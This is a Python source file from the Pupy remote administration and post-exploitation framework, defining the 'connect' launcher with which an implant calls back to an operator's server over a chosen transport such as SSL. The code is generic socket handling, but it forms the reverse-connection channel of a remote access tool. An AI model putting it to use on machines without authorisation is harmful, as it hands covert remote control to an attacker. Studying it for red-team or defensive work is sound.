# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root
# of the project for the detailed licence terms

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

__all__ = ['ConnectLauncher']

import argparse

from pupy.network.lib.utils import (
    parse_transports_args,
    create_client_transport_info_for_addr,
    parse_host
)

from pupy.network.lib.base_launcher import (
    LauncherError, LauncherArgumentParser, BaseLauncher
)

from pupy.network.conf import transports


from . import getLogger

logger = getLogger('connect')


class ConnectLauncher(BaseLauncher):
    """ simple launcher that uses TCP connect with a chosen transport """

    name = 'connect'
    credentials = ['SSL_BIND_CERT']

    __slots__ = (
        'args', 'hosts', 'connect_on_bind_payload', 'opt_args'
    )

    def __init__(self, *args, **kwargs):
        self.connect_on_bind_payload = kwargs.pop(
            'connect_on_bind_payload', False)
        super(ConnectLauncher, self).__init__(*args, **kwargs)

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = LauncherArgumentParser(
            prog="connect", description=cls.__doc__
        )
        cls.arg_parser.add_argument(
            '-c', '--host', metavar='<host:port>', required=True,
            action='append', help='host:port of the pupy server to '
            'connect to. You can provide multiple --host arguments '
            'to attempt to connect to multiple IPs'
        )
        cls.arg_parser.add_argument(
            '-t', '--transport', choices=transports, default="ssl",
            help='The transport to use'
        )
        cls.arg_parser.add_argument(
            'transport_args', nargs=argparse.REMAINDER,
            help='Transport arguments: key=value key=value ...'
        )

    def parse_args(self, args):
        super(ConnectLauncher, self).parse_args(args)

        self.opt_args = parse_transports_args(self.args.transport_args)
        self.hosts = [
            parse_host(host) for host in self.args.host
        ]

    def iterate(self):
        if self.args is None:
            raise LauncherError('parse_args needs to be called before iterate')

        for host_info in self.hosts:
            try:
                yield self.connect_to_host(host_info)
                self.reset_connection_info()

            except EOFError as e:
                logger.info('Connection closed: %s', e)

            except Exception as e:
                logger.exception(e)

    def connect_to_host(self, host_info):
        logger.info(
            'connecting to %s:%d using transport %s ...',
            host_info.host, host_info.port, self.args.transport
        )

        info = create_client_transport_info_for_addr(
            self.args.transport, host_info,
            self.opt_args, self.connect_on_bind_payload
        )

        logger.info('using client options: %s', info.client_args)
        logger.info('using transports options: %s', info.transport_args)

        info.transport.parse_args(info.transport_args)

        client = info.transport.client(**info.client_args)

        sock = client.connect(host_info.host, host_info.port)
        stream = info.transport.stream(
            sock,
            info.transport.client_transport,
            info.transport_args)

        self.set_connection_info(
            host_info.hostname, host_info.host, host_info.port,
            None, self.args.transport
        )

        return stream
